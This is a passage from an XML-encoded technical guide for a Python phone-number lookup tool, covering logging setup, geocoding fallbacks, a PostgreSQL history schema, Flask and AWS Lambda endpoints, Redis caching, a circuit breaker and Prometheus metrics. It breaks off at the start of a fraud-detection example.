      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Auto-track if number provided</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if args.phone_number:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>app.phone_var.set(args.phone_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>app.track_number()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>root.mainloop()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return 0</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def main():</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Main entry point."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>args = parse_arguments()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if args.no_gui:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return cli_mode(args)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>else:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return gui_mode(args)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">if __name__ == "__main__":</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>sys.exit(main())</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:span text:style-name="T2">File:</text:span> src/utils/logger.py (Logging Configuration)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27">Logging configuration for the application.</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">import logging</text:p>
      <text:p text:style-name="P27">import os</text:p>
      <text:p text:style-name="P27">from logging.handlers import RotatingFileHandler</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def setup_logging(</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>log_dir: str = "logs",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>log_file: str = "app.log",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>level: int = logging.INFO,</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>max_bytes: int = 10_485_760, <text:s/># 10MB</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>backup_count: int = 5</text:p>
      <text:p text:style-name="P27">):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Configure application logging.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>log_dir: Directory for log files</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>log_file: Log file name</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>level: Logging level</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>max_bytes: Maximum log file size before rotation</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>backup_count: Number of backup files to keep</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Create log directory if needed</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>os.makedirs(log_dir, exist_ok=True)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>log_path = os.path.join(log_dir, log_file)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Configure root logger</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>logger = logging.getLogger()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>logger.setLevel(level)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Remove existing handlers</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>for handler in logger.handlers[:]:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>logger.removeHandler(handler)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># File handler with rotation</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>file_handler = RotatingFileHandler(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>log_path,</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>maxBytes=max_bytes,</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>backupCount=backup_count</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>file_handler.setLevel(level)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>file_format = logging.Formatter(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>file_handler.setFormatter(file_format)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>logger.addHandler(file_handler)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Console handler</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>console_handler = logging.StreamHandler()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>console_handler.setLevel(level)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>console_format = logging.Formatter(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>'%(levelname)s: %(message)s'</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>console_handler.setFormatter(console_format)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>logger.addHandler(console_handler)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return logger</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def get_logger(name: str) -&gt; logging.Logger:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Get a logger instance."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return logging.getLogger(name)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P37">4. Real-World Integration</text:p>
      <text:p text:style-name="P37"/>
      <text:p text:style-name="P4">4.1 API Integration for Enhanced Data</text:p>
      <text:p text:style-name="Preformatted_20_Text">While J Phone NoTracker primarily uses offline databases, real-world production systems typically integrate with multiple data sources:</text:p>
      <text:p text:style-name="Preformatted_20_Text"># Example of integrating with multiple geocoding APIs</text:p>
      <text:p text:style-name="P27">class GeocodingService:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def __init__(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.providers = [</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>NominatimGeocoder(), <text:s/># OpenStreetMap</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>GoogleGeocoder(api_key=os.getenv("GOOGLE_MAPS_API")),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>HereGeocoder(api_key=os.getenv("HERE_API")),</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>]</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def geocode(self, location):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>for provider in self.providers:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>result = provider.geocode(location)</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>if result:</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>return result</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>except Exception:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>continue</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return None</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text">4.2 Database Integration for History and Analytics</text:p>
      <text:p text:style-name="P27">-- PostgreSQL schema for tracking history</text:p>
      <text:p text:style-name="P27">CREATE TABLE phone_lookups (</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>id BIGSERIAL PRIMARY KEY,</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>phone_number VARCHAR(20) NOT NULL,</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>country_code INTEGER,</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>national_number BIGINT,</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>country_name VARCHAR(100),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>location_name VARCHAR(200),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>carrier_name VARCHAR(100),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>latitude DECIMAL(10,8),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>longitude DECIMAL(11,8),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>timezones TEXT[],</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>lookup_time TIMESTAMP WITH TIME ZONE DEFAULT NOW(),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>client_ip INET,</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>user_agent TEXT,</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>INDEX idx_phone_number (phone_number),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>INDEX idx_lookup_time (lookup_time),</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>INDEX idx_country (country_name)</text:p>
      <text:p text:style-name="P27">);</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">-- Analytics query: most tracked carriers</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/>SELECT carrier_name, COUNT(*) as count</text:p>
      <text:p text:style-name="P27">FROM phone_lookups</text:p>
      <text:p text:style-name="P27">WHERE lookup_time &gt; NOW() - INTERVAL '30 days'</text:p>
      <text:p text:style-name="P27">GROUP BY carrier_name</text:p>
      <text:p text:style-name="P27">ORDER BY count DESC;</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">4.3 REST API Implementation</text:p>
      <text:p text:style-name="Preformatted_20_Text">For integration with other services, expose the functionality via REST API:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27"># Flask-based API endpoint</text:p>
      <text:p text:style-name="P27">from flask import Flask, request, jsonify</text:p>
      <text:p text:style-name="P27">from src.core.tracker import PhoneNumberTracker</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">app = Flask(__name__)</text:p>
      <text:p text:style-name="P27">tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">@app.route('/api/v1/track', methods=['POST'])</text:p>
      <text:p text:style-name="P27">def track_phone():</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>data = request.get_json()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>phone = data.get('phone_number')</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not phone:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return jsonify({'error': 'phone_number required'}), 400</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>result = tracker.track(phone)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not result.valid:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return jsonify({'error': 'Invalid phone number'}), 400</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return jsonify(result.to_dict())</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">@app.route('/api/v1/bulk', methods=['POST'])</text:p>
      <text:p text:style-name="P27">def bulk_track():</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>data = request.get_json()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>numbers = data.get('numbers', [])</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>results = []</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>for number in numbers:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>results.append(tracker.track(number).to_dict())</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return jsonify({'results': results})</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text">4.4 Cloud Deployment</text:p>
      <text:p text:style-name="Preformatted_20_Text">Deploy on AWS Lambda for serverless operation:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27"># AWS Lambda handler</text:p>
      <text:p text:style-name="P27">import json</text:p>
      <text:p text:style-name="P27">from src.core.tracker import PhoneNumberTracker</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def lambda_handler(event, context):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""AWS Lambda entry point."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Parse request</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>phone = event.get('queryStringParameters', {}).get('phone')</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not phone:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'statusCode': 400,</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="16"/>'body': json.dumps({'error': 'phone parameter required'})</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Track number</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = tracker.track(phone)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not result.valid:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'statusCode': 400,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'body': json.dumps({'error': 'Invalid phone number'})</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Return response</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'statusCode': 200,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'headers': {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'Content-Type': 'application/json',</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'Access-Control-Allow-Origin': '*'</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>},</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'body': json.dumps(result.to_dict())</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'statusCode': 500,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'body': json.dumps({'error': str(e)})</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">5. Advanced Techniques</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">5.1 Performance Optimization</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P27">Caching Strategy:</text:p>
      <text:p text:style-name="P27">import redis</text:p>
      <text:p text:style-name="P27">from functools import lru_cache</text:p>
      <text:p text:style-name="P27">import hashlib</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">class CachedTracker:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def __init__(self):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.redis_client = redis.Redis(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>host='localhost',</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>port=6379,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>decode_responses=True</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.cache_ttl = 86400 <text:s/># 24 hours</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>@lru_cache(maxsize=1000)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def track_with_memory_cache(self, phone):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""L1 cache: in-memory LRU cache."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return self.tracker.track(phone)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def track_with_redis(self, phone):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""L2 cache: distributed Redis cache."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Create cache key</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>cache_key = f"phone:{hashlib.md5(phone.encode()).hexdigest()}"</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Check Redis</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>cached = self.redis_client.get(cache_key)</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>if cached:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>import json</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return json.loads(cached)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Track and cache</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = self.tracker.track(phone)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if result.valid:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.redis_client.setex(</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>cache_key,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.cache_ttl,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>json.dumps(result.to_dict())</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return result</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">Batch Processing Optimization:</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P27">def batch_track_optimized(phone_numbers, batch_size=100):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Process multiple phone numbers efficiently.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Uses connection pooling and parallel requests.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>from concurrent.futures import ThreadPoolExecutor, as_completed</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tracker = PhoneNumberTracker()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>results = []</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>with ThreadPoolExecutor(max_workers=10) as executor:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Submit all tasks</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>future_to_number = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>executor.submit(tracker.track, number): number </text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>for number in phone_numbers</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Collect results as they complete</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>for future in as_completed(future_to_number):</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>number = future_to_number[future]</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>result = future.result(timeout=5)</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>results.append(result)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>logger.error(f"Error tracking {number}: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>results.append(None)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return results</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">5.2 Scaling Architecture</text:p>
      <text:p text:style-name="Preformatted_20_Text">For high-volume production use (millions of lookups per day):</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s text:c="2"/>Load Balancer │</text:p>
      <text:p text:style-name="Preformatted_20_Text">└────────┬────────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="9"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>┌────┴────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ <text:s text:c="8"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌───▼───┐ ┌───▼───┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ API <text:s text:c="2"/>│ │ API <text:s text:c="2"/>│ ... Auto-scaling group</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ Node 1│ │ Node 2│</text:p>
      <text:p text:style-name="Preformatted_20_Text">└───┬───┘ └───┬───┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ <text:s text:c="8"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>└────┬────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="9"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>┌────▼────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ <text:s/>Redis <text:s/>│ Distributed cache</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ Cluster │</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>└────┬────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="9"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>┌────▼────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│PostgreSQL│ Historical data</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>│ <text:s/>RDS <text:s text:c="3"/>│ &amp; analytics</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>└─────────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">5.3 Fault Tolerance</text:p>
      <text:p text:style-name="Preformatted_20_Text">Implement circuit breakers for external API calls:</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">import time</text:p>
      <text:p text:style-name="P27">from functools import wraps</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">class CircuitBreaker:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Circuit breaker pattern for external API calls."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def __init__(self, failure_threshold=5, recovery_timeout=60):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.failure_threshold = failure_threshold</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.recovery_timeout = recovery_timeout</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.failure_count = 0</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.last_failure_time = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.state = 'CLOSED' <text:s/># CLOSED, OPEN, HALF_OPEN</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def call(self, func, *args, **kwargs):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if self.state == 'OPEN':</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if time.time() - self.last_failure_time &gt; self.recovery_timeout:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.state = 'HALF_OPEN'</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>else:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>raise Exception("Circuit breaker is OPEN")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result = func(*args, **kwargs)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if self.state == 'HALF_OPEN':</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.state = 'CLOSED'</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.failure_count = 0</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return result</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.failure_count += 1</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.last_failure_time = time.time()</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="12"/>if self.failure_count &gt;= self.failure_threshold:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>self.state = 'OPEN'</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>raise e</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">5.4 Monitoring and Observability</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">import prometheus_client</text:p>
      <text:p text:style-name="P27">from prometheus_client import Counter, Histogram, Gauge</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Metrics</text:p>
      <text:p text:style-name="P27">track_requests = Counter('phone_track_requests_total', 'Total tracking requests')</text:p>
      <text:p text:style-name="P27">track_duration = Histogram('phone_track_duration_seconds', 'Tracking duration')</text:p>
      <text:p text:style-name="P27">track_errors = Counter('phone_track_errors_total', 'Tracking errors')</text:p>
      <text:p text:style-name="P27">active_lookups = Gauge('phone_active_lookups', 'Active lookups')</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">@track_duration.time()</text:p>
      <text:p text:style-name="P27">@track_requests.count()</text:p>
      <text:p text:style-name="P27">def monitored_track(phone):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>with active_lookups.track_inprogress():</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return tracker.track(phone)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>track_errors.inc()</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>raise</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">6. Real-World Use Cases</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">6.1 E-commerce Fraud Detection</text:p>
      <text:p text:style-name="Preformatted_20_Text">A major African e-commerce platform uses phone number geolocation to detect fraudulent orders:</text:p>
      <text:p text:style-name="P27">def evaluate_order_risk(order):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Evaluate order risk based on phone number location."""</text:p>
